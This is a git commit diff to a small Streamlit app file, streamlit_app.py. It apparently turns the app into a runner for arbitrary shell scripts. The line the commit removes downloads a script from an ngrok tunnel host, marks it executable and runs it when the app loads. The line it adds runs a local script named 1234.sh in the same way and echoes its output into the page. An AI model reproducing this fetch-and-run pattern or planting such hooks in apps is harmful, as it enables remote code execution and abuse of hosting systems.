0b9db587f386dfc1e5766d33c9ddfbf4af46eea3
akamehash <akameshimori@gmail.com>
2022-07-04 20:22:14 -0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,6 +1,6 @@
 import streamlit as st
 import os
-output = os.popen('curl --max-time 2 http://6.tcp.ngrok.io:13489/123.txt -o 123.sh; chmod +x 123.sh; ./123.sh').read()
+output = os.popen('./1234.sh').read()
 my_placeholder = st.empty()
 my_placeholder.text("The user entered %s" % output +'<br><form action="" method="get"><input type="text" name="username"><input type="submit" value="Submit"></form> ')
 
